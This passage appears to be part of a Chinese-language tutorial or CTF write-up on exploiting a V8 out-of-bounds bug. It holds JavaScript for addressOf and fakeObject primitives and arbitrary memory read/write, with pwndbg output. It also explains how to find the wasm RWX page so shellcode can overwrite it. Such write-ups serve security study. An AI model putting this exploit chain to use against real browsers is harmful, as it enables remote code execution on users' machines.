    function addressOf(obj_to_leak)
    {
        obj_array[0] = obj_to_leak;
        obj_array.oob(float_array_map);
        let obj_addr = f2i(obj_array[0]) - 1n;//泄漏出来的地址-1才是真实地址
        obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
        return obj_addr;
    }
    function fakeObject(addr_to_fake)
    {
        float_array[0] = i2f(addr_to_fake + 1n);//地址需要+1才是v8中的正确表达方式
        float_array.oob(obj_array_map);
        let faked_obj = float_array[0];
        float_array.oob(float_array_map); // 还原array类型以便后续继续使用
        return faked_obj;
    }
    // ××××××××3.read & write anywhere××××××××
    // 这是一块我们可以控制的内存
    var fake_array = [                //伪造一个对象
        float_array_map,
        i2f(0n),
        i2f(0x41414141n),// fake obj's elements ptr
        i2f(0x1000000000n),
        1.1,
        2.2,
    ];
    // 获取到这块内存的地址
    var fake_array_addr = addressOf(fake_array);
    // 将可控内存转换为对象
    var fake_object_addr = fake_array_addr - 0x30n;
    var fake_object = fakeObject(fake_object_addr);
    // 任意地址读
    function read64(addr)
    {
        fake_array[2] = i2f(addr - 0x10n + 0x1n);
        let leak_data = f2i(fake_object[0]);
        return leak_data;
    }
    // 任意地址写
    function write64(addr, data)
    {
        fake_array[2] = i2f(addr - 0x10n + 0x1n);
        fake_object[0] = i2f(data);    
    }
    // ××××××××4. 测试××××××××
    var a = [1.1,2.2,3.3];
    var address = addressOf(a);
    var read = read64(address);
    console.log("[*]read 0x"+hex(address)+":0x"+hex(read));
    %DebugPrint(a);
    %SystemBreak();
    write64(address,0x01020304n);
    %SystemBreak();
创建一个对象，找到他的地址。
读取对象地址存储的内容，然后改写对象地址存储的内容。
    pwndbg> r
    [...]
    [*]read 0x000031f15738fa50:0x0000369d9e942ed9//读取出来对象地址存的数据是0x0000369d9e942ed9
    0x31f15738fa51 
    //查看对象地址的内存，发现和读取出来的一样
    pwndbg> telescope 0x000031f15738fa50
    00:0000│   0x31f15738fa50 —▸ 0x369d9e942ed9 ◂— 0x400002d1469d401  c
    Continuing.
    pwndbg> telescope 0x000031f15738fa50
    00:0000│   0x31f15738fa50 ◂— 0x1020304                 wasm是让JavaScript直接执行高级语言生成的机器码的一种技术。
>
>
> 使用：网站[https://wasdk.github.io/WasmFiddle/：在线将C语言直接转换为wasm并生成JS配套调用代码。（左下角选择Code](https://wasdk.github.io/WasmFiddle/%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%B0%86C%E8%AF%AD%E8%A8%80%E7%9B%B4%E6%8E%A5%E8%BD%AC%E6%8D%A2%E4%B8%BAwasm%E5%B9%B6%E7%94%9F%E6%88%90JS%E9%85%8D%E5%A5%97%E8%B0%83%E7%94%A8%E4%BB%A3%E7%A0%81%E3%80%82%EF%BC%88%E5%B7%A6%E4%B8%8B%E8%A7%92%E9%80%89%E6%8B%A9Code)
> Buffer，然后点击最上方的Build按钮，左下角生成了我们需要的wasm代码。）
>
> 
>
> 问题：wasm中只能运行数学计算、图像处理等系统无关的高级语言代码。所以不能直接在wasm中写入我们的shellcode，然后浏览器调用执行。
>
> 方案：结合漏洞将原本内存中的的wasm代码替换为shellcode，当后续调用wasm的接口时，实际上调用的就是我们的shellcode了。
步骤：
1.首先加载一段wasm代码到内存中
2.然后通过addressOf找到存放wasm的内存地址
3.接着通过任意地址写原语用shellcode替换原本wasm的代码内容
4.最后调用wasm的函数接口即可触发调用shellcode
####  寻找存放wasm代码的内存页地址
通过Function—>shared_info—>WasmExportedFunctionData—>instance，在instance+0x88的固定偏移处，就能读取到存储wasm代码的内存页起始地址。
    //test.js，用debug版本调试
    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule, {});
    var f = wasmInstance.exports.main;
    %DebugPrint(f);
    %SystemBreak();
    winter@ubuntu:~/v8/v8/out.gn/x64.debug$ gdb ./d8 
    [...]
    pwndbg> set args --allow-natives-syntax test.js 
    pwndbg> r
    [...]
    DebugPrint: 0x2c708e5dfab9: [Function] in OldSpace
     - map: 0x07f1e5ac4379  [FastProperties]
     - prototype: 0x2c708e5c2109 
     - elements: 0x1c0c1f4c0c71  [HOLEY_ELEMENTS]
     - function prototype: 
     - shared_info: 0x2c708e5dfa81              
     - formal_parameter_count: 0
     - kind: NormalFunction
    [...]
    //shared_info在Function+0x18的位置
    pwndbg> telescope 0x2c708e5dfab9-1
    00:0000│   0x2c708e5dfab8 —▸ 0x7f1e5ac4379 ◂— 0x700001c0c1f4c01
    01:0008│   0x2c708e5dfac0 —▸ 0x1c0c1f4c0c71 ◂— 0x1c0c1f4c08
    ... ↓
    03:0018│   0x2c708e5dfad0 —▸ 0x2c708e5dfa81 ◂— 0x5900001c0c1f4c09      job 0x2c708e5dfa81
    0x2c708e5dfa81: [SharedFunctionInfo] in OldSpace
     - map: 0x1c0c1f4c09e1 
     - name: 0x1c0c1f4c4ae1 
     - kind: NormalFunction
     - function_map_index: 144
     - formal_parameter_count: 0
     - expected_nof_properties: 0
     - language_mode: sloppy
     - data: 0x2c708e5dfa59                     
     - function token position: -1
    [...]
    //WasmExportedFunctionData在SharedFunctionInfo+0x8的位置
    pwndbg> telescope 0x2c708e5dfa81-1
    00:0000│   0x2c708e5dfa80 —▸ 0x1c0c1f4c09e1 ◂— 0x700001c0c1f4c01
    01:0008│   0x2c708e5dfa88 —▸ 0x2c708e5dfa59 ◂— 0x100001c0c1f4c58     job 0x2c708e5dfa59
    0x2c708e5dfa59: [WasmExportedFunctionData] in OldSpace
     - map: 0x1c0c1f4c5879 
     - wrapper_code: 0x3e5b7d3c2001 
     - instance: 0x2c708e5df8c1              telescope 0x2c708e5dfa59-1
    00:0000│   0x2c708e5dfa58 —▸ 0x1c0c1f4c5879 ◂— 0x500001c0c1f4c01
    01:0008│   0x2c708e5dfa60 —▸ 0x3e5b7d3c2001 ◂— or     cl, byte ptr [rdi + rbx + 0xc]
    02:0010│   0x2c708e5dfa68 —▸ 0x2c708e5df8c1 ◂— 0x71000007f1e5ac97     telescope 0x2c708e5df8c1-1+0x88
    00:0000│   0x2c708e5df948 —▸ 0x1864fd681000 ◂— movabs r10, 0x1864fd681260 /* 0x1864fd681260ba49 */
    01:0008│   0x2c708e5df950 —▸ 0x6158a14e409 ◂— 0x71000007f1e5ac91
    02:0010│   0x2c708e5df958 —▸ 0x6158a14e679 ◂— 0x71000007f1e5acad
    03:0018│   0x2c708e5df960 —▸ 0x2c708e5c1869 ◂— 0x1c0c1f4c0f
    04:0020│   0x2c708e5df968 —▸ 0x2c708e5df9e9 ◂— 0x71000007f1e5aca1
    05:0028│   0x2c708e5df970 —▸ 0x1c0c1f4c04d1 ◂— 0x1c0c1f4c05
    ... ↓
    pwndbg> vmmap 0x1864fd681000
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x1864fd681000     0x1864fd682000 rwxp     1000 0       +0x0
所以，根据以上，可以编写代码自动查找该地址。
    var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;
    var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;
    var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;
    var rwx_page_addr = read64(wasm_instance_addr + 0x88n);
    console.log("[*] leak rwx_page_addr: 0x" + hex(rwx_page_addr));
整合的调试代码如下：
    // ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
    var buf = new ArrayBuffer(16);
    var float64 = new Float64Array(buf);
    var bigUint64 = new BigUint64Array(buf);
    // 浮点数转换为64位无符号整数
    function f2i(f)
    {
        float64[0] = f;
        return bigUint64[0];
    }
    // 64位无符号整数转为浮点数
    function i2f(i)